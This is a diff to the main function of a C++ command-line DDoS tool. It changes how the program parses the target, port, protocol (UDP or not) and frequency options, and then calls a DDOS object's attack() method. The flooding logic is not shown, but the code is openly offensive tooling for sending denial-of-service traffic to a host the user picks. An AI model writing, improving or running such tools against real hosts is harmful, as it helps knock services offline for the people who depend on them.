@@ -5,11 +5,11 @@ int main(int argc, char **argv) {
   int c;
   struct option options[] = {
       {"port",         required_argument, 0, 'p'},
-      {"type",         required_argument, 0, 't'},
+      {"protocol",     required_argument, 0, 't'},
       {"frequency",    required_argument, 0, 'f'},
       {"target",       required_argument, 0, 'c'}
   };
-  vector<string> commands = {"80", "UDP", "10", ""};
+  map<string, string> commands;
 
   while(true) {
     c = getopt_long(argc, argv, "p:t:f:c:", options, NULL);
@@ -19,19 +19,19 @@ int main(int argc, char **argv) {
 
     switch (c) {
       case 'p':
-        commands[0] = optarg;
+        commands["port"] = optarg;
         break;
 
       case 't':
-        commands[1] = optarg;
+        commands["protocol"] = optarg;
         break;
 
       case 'f':
-        commands[2] = optarg;
+        commands["freqency"] = optarg;
         break;
 
       case 'c':
-        commands[3] = optarg;
+        commands["target"] = optarg;
         break;
 
       case '?':
@@ -43,18 +43,18 @@ int main(int argc, char **argv) {
       }
     }
 
-    MIN_SUPER_INT port = atoi(commands[0].c_str());
-    MAX_SUPER_INT frequency = atoi(commands[2].c_str());
-    bool type = (protocol(commands[1])) ? true : false;
+    MIN_SUPER_INT port = atoi(commands["port"].c_str());
+    MAX_SUPER_INT frequency = atoi(commands["freqency"].c_str());
+    bool protocol = (protocolChecking(commands["protocol"])) ? true : false;
 
     subChecking(&port, &frequency);
 
-    DDOS go(commands[3], frequency, port, type);
+    DDOS go(commands["target"], frequency, port, protocol);
     go.attack();
   return 0;
 }
 
-static bool protocol(string target) {
+static bool protocolChecking(string target) {
   regex protocol("UDP");
   return (regex_match(target.c_str(), protocol)) ? true : false;
 }
